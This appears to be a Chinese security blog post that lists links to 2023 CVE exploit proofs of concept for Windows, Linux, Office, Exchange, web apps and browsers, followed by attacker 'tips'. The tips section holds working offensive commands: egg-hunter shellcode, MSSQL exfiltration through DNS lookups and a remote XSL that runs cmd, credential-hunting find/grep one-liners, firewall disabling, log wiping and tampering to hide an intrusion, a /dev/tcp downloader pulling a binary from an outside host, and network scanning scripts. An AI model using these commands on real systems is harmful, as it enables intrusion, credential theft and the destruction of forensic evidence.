---
layout: post
title:  "cve2023-and-web-ctf-tips收集-and-php"
categories: hack
tags:  代码审计
author: cn6u9
---

* content
{:toc}
- 记事本



[web_ctf](https://github.com/cn6u9/cn6u9/blob/main/Web-ctf-cheatsheet.md)  
[shenji.py](https://github.com/cn6u9/cn6u9.github.io/blob/main/tools/shenji.py)  
[手工调试php输出](https://github.com/cn6u9/cn6u9.github.io/blob/main/tools/debug.php)  

Wireguard 项目的 Wintun 接口  
OpenVPN 的 Tap 接口  
opengnb  

https://github.com/UCL-CREST/doublefetch c语言静态漏洞挖掘函数  
https://github.com/sha0coder/maripyli 使用python2，是php静态代码分析工具  
https://github.com/synacktiv/php_filter_chains_oracle_exploit 有意思的漏洞  

windows lpe
CVE-2023-21752 https://github.com/Wh04m1001/CVE-2023-21752   PoC for arbitrary file delete vulnerability in Windows Backup service
CVE-2023–21746  https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc LPE via StorSvc
CVE-2023-21768 https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 Windows 11 
CVE-2023-21823 https://github.com/Elizarfish/CVE-2023-21823 windows bitmap组件漏洞 poc应该是假的  
CVE-2023-29336 https://github.com/m-cetin/CVE-2023-29336 Win32k Local Privilege  
CVE-2023-28252 https://github.com/fortra/CVE-2023-28252 clfs.sys  
CVE-2022-44666 https://github.com/j00sean/CVE-2022-44666 Microsoft Windows Contacts  
CVE-2023-36899 https://github.com/d0rb/CVE-2023-36899 ASP.NET Elevation of Cookieless IIS Auth Bypass & App Pool Privesc  
CVE-2023-36874 https://github.com/d0rb/CVE-2023-36874 Windows Error Reporting Service lpe  
CVE-2023-36900 无poc Windows Common Log File System Driver Elevation of Privilege Vulnerability  
CVE-2023-29336 https://github.com/ayhan-dev/p0ropc Win32k Elevation of Privilege Vulnerability all version  
CVE-2023-28229 https://github.com/Y3A/CVE-2023-28229 Windows CNG Key Isolation Service Elevation of Privilege Vulnerability  
CVE-2023-29360 https://github.com/Nero22k/cve-2023-29360 Microsoft Streaming Service Elevation of Privilege Vulnerability windows流媒体提全  
CVE-2023-36802 https://github.com/chompie1337/Windows_MSKSSRV_LPE_CVE-2023-36802 Windows 11 22H2  
CVE-2023-36723 https://github.com/Wh04m1001/CVE-2023-36723 Windows Container Manager Service Elevation of Privilege Vulnerability  

windows rce

CVE-2022-34718 https://github.com/numencyber/Vulnerability_PoC/blob/main/CVE-2022-34718/poc.cpp  TCP/IP RCE Vulnerability  
CVE-2023-28231 https://github.com/numencyber/Vulnerability_PoC/blob/main/CVE-2023-28231/CVE-2023-28231-DHCP-VUL-PoC.cpp  MICROSOFT WINDOWS SERVER 2008-2019 DHCP SERVER  
CVE-2023-28231 https://github.com/glavstroy/CVE-2023-28231  MICROSOFT WINDOWS SERVER 2008-2019 DHCP SERVER   

word and pdf and rar and wps

CVE_2023_21716 https://github.com/Xnuvers007/CVE-2023-21716    RTF Crash POC

cve-2023-23397 https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY  microsoft-outlook-elevation-of-privilege-vulnerability

CVE-2023-27363 https://github.com/webraybtl/CVE-2023-27363 福昕Foxit PDF远程代码执行漏洞  
CVE-2023-36884 Office and Windows HTML Remote Code Execution Vulnerability  
CVE-2022-30190 https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed Microsoft Office MSDT  
CVE-2023-40477 https://github.com/cn6u9/cn6u9.github.io/blob/main/tools/CVE-2023-40477.sh winrar rce  
CVE-2023-38831 https://github.com/Garck3h/cve-2023-38831 winrar rce  
wps rce  https://github.com/ba0gu0/wps-rce WPS Office 2023 个人版 < 11.1.0.15120---WPS Office 2019 企业版 < 11.8.2.12085  
CVE-2022-21974 https://github.com/0vercl0k/CVE-2022-21974 winword  
CVE-2023-28288 https://www.exploit-db.com/exploits/51543 Microsoft SharePoint Enterprise Server 2016 - Spoofing  


linux lpe

CVE-2023-22809  https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc   sudo 1.8.0 to 1.9.12p1

CVE-2023-0179   https://github.com/TurtleARM/CVE-2023-0179-PoC    Linux versions from 5.5 to 6.2-rc3

CVE-2023-0045   https://github.com/es0j/CVE-2023-0045        ubuntu 22.04.1-Linux 5.15.0-56-generic

CVE-2023-2002   https://github.com/lrh2000/CVE-2023-2002/blob/master/exp/bt_power.c 蓝牙提权  
CVE-2023-0386   https://github.com/xkaneiki/CVE-2023-0386  ubuntu提权   
CVE-2023-20052  https://github.com/nokn0wthing/CVE-2023-25002   clamav 杀毒xxe注入   
CVE-2023-20032  https://github.com/cn6u9/cn6u9.github.io/blob/main/tools/hfsplus.zip   clamav HFS+ file parser rce     
CVE-2023-2008   https://github.com/bluefrostsecurity/CVE-2023-2008  Ubuntu 22.04 Linux kernel fixed in 5.19-rc4

CVE-2023-1829 https://github.com/lanleft/CVE2023-1829 Ubuntu22.04 source code 5.15.0-25.25  
CVE-2023-32233 https://github.com/Liuk3r/CVE-2023-32233 Ubuntu 23.04 linux-image-6.2.0-20-generic  
CVE-2023-3338 https://github.com/TurtleARM/CVE-2023-3338 linux kernel 5.15  
CVE-2023-35001 https://github.com/synacktiv/CVE-2023-35001 Ubuntu desktop 5.19.0-35  
CVE-2023-35829 https://github.com/ChriSanders22/CVE-2023-35829-poc Linux kernel 6.3.2.use-after-free was found in rkvdec_remove  
CVE-2023-2640 https://github.com/luanoliveira350/GameOverlayFS OverlayFS Ubuntu 20.04 with kernel 5.4.0  
CVE-2023-32629 https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629 Ubuntu 18.04 and 22.04 LTS  kernels 5.19.0 and 6.2.0  
CVE-2023-4911 https://github.com/RickdeJager/CVE-2023-4911 Ubuntu 22.10  glibc 2.34 ld.so  
CVE-2023-3269 


Exchange  and  outlook  
CVE-2023-21707 https://github.com/N1k0la-T/CVE-2023-21707 Microsoft Exchange Server Remote Code Execution Vulnerability  
CVE-2023-23397 https://github.com/CKevens/CVE-2023-23397-POC/blob/main/CVE-2023-23397.py outlook 2019 auto get NetNTLM  
CVE-2023-29357 https://github.com/Chocapikk/CVE-2023-29357 Microsoft SharePoint Server Elevation of Privilege Vulnerability  
CVE-2023-36745 https://github.com/N1k0la-T/CVE-2023-36745  Microsoft Exchange Server Remote Code Execution Vulnerability 需要在内网，需要有帐号  
CVE-2023-32031 https://github.com/Avento/CVE-2023-32031 CVE-2023-32031 MS Exchange PowerShell backend RCE  
域控  
https://github.com/Amulab/advul  
CVE-2020-1472  
CVE-2021-42287  
CVE-2022-26923  
CVE-2022-33679  

web

Joomla 未授权访问漏洞 CVE-2023-23752
Weblogic CVE-2023-21839 RCE  
Weblogic CVE-2023-21931  无poc  
weblogic https://github.com/MMarch7/weblogic_CVE-2023-21931_POC-EXP  
CVE-2023-34192 Zimbra XSS To RCE  
CVE-2023-28467 mybb1.8.33 email xss  
CVE-2023-32315 https://github.com/Pari-Malam/CVE-2023-32315 openfire  
CVE-2023-29489 https://github.com/ViperM4sk/cpanel-xss-177 cPanel 11.102.0.x-11.109.9999.116 xss  
CVE-2023-25135 https://github.com/getdrive/PoC/tree/main/2023/vbulletin vbulletin.version:<=5.6.9 rce  
Spring Framework 6.0.7 and 5.3.26 fix cve-2023-20860 and cve-2023-20861  
CVE-2023-34039 https://github.com/Cyb3rEnthusiast/CVE-2023-34039 VMware newest exploit  
CVE-2023-41362 https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE MyBB_ACP_RCE  
CVE-2023-22515 https://github.com/Chocapikk/CVE-2023-22515 Confluence Data Center  


IOT  
CVE-2023-3519 https://github.com/getdrive/PoC/tree/main/2023/Citrix%20ADC%20RCE%20CVE-2023-3519 Citrix VPX 13.1-48.47  


Browser  

chrome cvc-2023-2033 无poc  
chrome CVE-2023-3079 https://github.com/mistymntncop/CVE-2023-3079    
chrome CVE-2023-4863 https://github.com/mistymntncop/CVE-2023-4863 WebP in Google Chrome prior to 116.0.5845.187  
chrome CVE-2023-4762 https://github.com/sherlocksecurity/CVE-2023-4762-Code-Review Google Chrome prior to 116.0.5845.179  
ios Safari 17 CVE-2023-41993 https://github.com/po6ix/POC-for-CVE-2023-41993 iOS 16.7 and iPadOS 16.7, macOS Sonoma 14  

Oracle  
CVE-2023-22074 https://github.com/emad-almousa/CVE-2023-22074 Oracle Database Server 19.3-19.20 and 21.3-21.11  

vmware esxi and vcenter  
cve-2022-31705 https://github.com/s0duku/cve-2022-31705 Test on windows vmware workstation 16.2.0, with guest os ubuntu server 22  
CVE-2021-21974 https://github.com/Shadow0ps/CVE-2021-21974 VMWare ESXi RCE Exploit  
cve-2022-31680 https://www.idappcom.co.uk/post/vmware-vcenter-server-code-execution-cve-2022-31680 有帐号之后才能提权  


other

CVE-2022-44268 https://github.com/agathanon/cve-2022-44268 ImageMagick
cve-2022-31705 https://github.com/s0duku/cve-2022-31705 windows vmware workstation 16.2.0

CVE-2022-26923 域提权  
CVE-2023-27997 FortiOS SSL-VPN buffer overflow vulnerability  

CVE-2023-21554-RCE https://github.com/zoemurmure/CVE-2023-21554-PoC   Windows MessageQueuing PoC  
CVE-2023-2868  https://github.com/cfielding-r7/poc-cve-2023-2868 梭子鱼本地提权漏洞poc在本地  
CVE-2023-3519 Citrix RCE  
CVE-2023-4966 https://github.com/Chocapikk/CVE-2023-4966 Citrix Memory Leak Exploit  

CVE-2023-20871  https://github.com/ChriSanders22/CVE-2023-20871-poc VMware Fusion Raw Disk local privilege escalation vulnerability  
CVE-2023-34312  https://github.com/vi3t1/qq-tim-elevation Tencent QQ/TIM Local Privilege Elevation  
CVE-2023-40031 https://github.com/webraybtl/CVE-2023-40031 notepad++堆缓冲区溢出漏洞  
CVE-2023-26818 https://github.com/Zeyad-Azima/CVE-2023-26818 Telegram  
CVE-2023-38545 https://github.com/imfht/CVE-2023-38545 curl 堆溢出 影响面积挺大  
CVE-2023-34051 https://github.com/horizon3ai/CVE-2023-34051 VMware vRealize Log Insight  
CVE-2023-46747 https://github.com/AliBrTab/CVE-2023-46747-POC F5 BIG-IP unauthenticated remote code execution  

tips：  
shellcode:
```
（1）、搜寻堆栈；
      push  esp
      pop   edi
      push  esp 
      pop   ecx
      mov eax,0x90909090  // 5 bytes   mov ax,0x9090   4 bytes
      repnz
      scasd               //1 bytes    scasw          2 bytes   4+2=5+1
          push edi
          ret
         简化的版本可能是6字节的shellcode：
      push  esp
      pop   edi
      repnz
      scasd
          push edi
          ret
 
    (2)、搜寻堆中shellcode。
          mov  eax,dword ptr [0x7ffdf018]
          add   ax,0x017c
          mov  edi,dword ptr [eax]
          push  eax
          pop   ecx        
          std 
          repnz
          scasw
          push edi
          ret
 
   如果堆的位置大致固定，可以简化：          
 
          mov   edi,0x11223344
          push   edi
          pop    eax
          repnz
          scasw
          push   edi
          ret
```

tips mssql反弹命令：  
```
BEGIN TRY
   exec sp_configure 'show advanced options',1
   reconfigure
END TRY
BEGIN CATCH
  declare @d varchar(8000)
  set @d = master.dbo.fn_varbintohexstr(convert(varbinary(max), substring(ERROR_MESSAGE(),1,10)))
  set @d='\\'+@d+'.19c.dnslog.cn\a'
  select @d
  exec xp_dirtree @d,1,1
  waitfor delay '00:00:03'
END CATCH




再给大家分享一个代码
declare @o int, @hr int, @str varchar(8000), @url varchar(2000)
set @url = 'http://1.1.75.0:443/2.xsl?' + convert(varchar, getdate(), 14) 
exec sp_oacreate 'msxml2.domdocument', @o out
exec sp_oasetproperty @o, 'async', false
exec sp_oamethod @o, 'load', @hr out, @url
exec sp_oamethod @o, 'transformNode', @str out, @o
exec sp_OADestroy @o
select @str

<xsl:stylesheet
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:user="http://mycompany.com/mynamespace"
xmlns:msxsl="urn:schemas-microsoft-com:xslt" version="1.0">
<xsl:output method="text" encoding="UTF-8" />
<xsl:template match="/">
	<xsl:value-of select="user:run()"/>
</xsl:template>
<msxsl:script language="javascript" implements-prefix="user">
function run () {
	try {
		var shell = new ActiveXObject('Wscript.Shell');
		return shell.exec('cmd /c ver').StdOut.ReadAll();	
	}
	catch(e) {
		return e.description;
	}
}
</msxsl:script>
</xsl:stylesheet>

sp_MSforeachtable和sp_MSforeachdb

```

```
#查找所有带user和pass的txt
find / -type f  -name "user*.txt" -or -name "pass*.txt" 2> /dev/null 
#查找所有文件中的账号密码
find / -type f|egrep -v "*.js"|egrep -v "*.css"|egrep -v "*.html"|egrep -v "*.htm"|egrep -v "*.woff"|egrep -v "*.jar"|egrep -v "*.java"|egrep -v "*.class"|egrep -v "*.properties"|egrep -v "*.MF"|egrep -v "*.tmp"|egrep -v "*.vm"|egrep -v "*.svn*"|egrep -v "*LICENSE*"|egrep -v "*.exe"|egrep -v "*.xml"|egrep -v "*.svg"|xargs egrep -s -i  "*user:|*user=|username:|username=|*pass:|*pass=|password:|password=|passwd:|passwd=|账号：|账号:|用户名：|用户名:|密码：|密码:" --color
#若需同时执行可以用 & 连接，即'命令1&命令2'
```
```
netsh advfirewall firewall show rule name=all
netsh advfirewall firewall add rule name="Open Port" dir=out action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="Open Port" dir=in action=allow protocol=TCP localport=80

netsh advfirewall firewall add rule name="Open Port" dir=out action=allow protocol=UDP localport=53

netsh advfirewall firewall add rule name="Open Port" dir=in action=allow protocol=UDP localport=53

netsh firewall set opmode disable 关闭防火墙
netsh firewall set opmode enable 开启防火墙

```

```
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0

    /var/log/btmp   记录所有登录失败信息，使用lastb命令查看
    /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看
    /var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看
    /var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看
    /var/log/secure   记录与安全相关的日志信息
    /var/log/message  记录系统启动后的信息和错误日志
centos 
utmpdump /var/log/wtmp |sed "s/8.8.8.8/1.1.1.1/g" |utmpdump -r >/tmp/wtmp1 &&\mv  /tmp/wtmp1 /var/log/wtmp

ssh -T root@192.168.0.1 /bin/bash -i

sed  -i '/攻击ip/d'  /var/log/secure    # 删除登录日志攻击ip所在的行
sed -i 's/192.168.1.1/127.0.0.1/g' /var/log/access.log  # 全局替换访问IP地址
cat /var/log/nginx/access.log | grep -v shell.php > tmp.log  # 删除入侵相关信息
cat tmp.log > /var/log/nginx/access.log/  # 把修改过的日志覆盖到原日志文件


 echo > /var/log/wtmp //清除用户登录记录
 echo > /var/log/btmp //清除尝试登录记录
 echo > /var/log/lastlog //清除最近登录信息
 echo > /var/log/secure //登录信息
 echo > /var/log/messages
 echo > /var/log/syslog //记录系统日志的服务
 echo > /var/log/xferlog
 echo > /var/log/auth.log
 echo > /var/log/user.log
 cat /dev/null > /var/adm/sylog
 cat /dev/null > /var/log/maillog
 cat /dev/null > /var/log/openwebmail.log
 cat /dev/null > /var/log/mail.info
 echo > /var/run/utmp
echo > /root/.bash_history
history -cw 


```

```
  
wevtutil cl system
wevtutil cl application
wevtutil cl security

reg query HKLM\SOFTWARE\Classes\.tudf /s

attrib +h +s +r "Server.dat"
```
```
function DOWNLOAD() {
  url=$1
  proto="http://"
  host=${url/$proto/}
  server=${host%%/*}
  path=${host#*/}
  DOC=/${path// /}
  HOST=${server/:*/}
  PORT=${server/*:/}
  [[ -n ${PORT} ]] || PORT=80
  PORT=$(( PORT + 0 ))
  exec 3<>/dev/tcp/${HOST}/${PORT}
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do
    [[ "${line}" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do
    printf "%s${nul}" "${x}"
  done <&3
  exec 3>&-
}
DOWNLOAD http://g.com:80/scan >scan
```

```
#! /bin/bash
if [ "$1" == "" ]
then
	echo "Usage: ./ping.sh [network]"
       	echo "Example: ./ping.sh 192.168.197"
else
	for ip in $(seq 1 254);do
		ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | sed 's/.$//' &
	done
	fi
```
```
#!/bin/bash
HOST=$1
PORT="21 22 53 80 81 82 83 84 85 86 87 88 89 161 389 3690 7788 5985 512 513 514 873 1521 1025 2222 2601 2604 3128 3389 5632 5900 10000 28017 50000 50070 50030 135 139 443 445 1433 3306 5432 6379 7001 8000 8080 8089 9000 9200 11211 27017"
for PORT in $PORT; do
    if echo &>/dev/null > /dev/tcp/$HOST/$PORT; then
        echo "$PORT open"
   #else
        #echo "$PORT close"
    fi
done


```
```
#!/bin/bash
PORT="21 22"
for i in {1..255}; do
    HOST="192.168.1.$i"

    for PORT in $PORT; do
        if echo &>/dev/null > /dev/tcp/$HOST/$PORT; then
            echo "$HOST:$PORT open"
        #else
            #echo "$HOST:$PORT close"
        fi
    done
done

```

# 小结
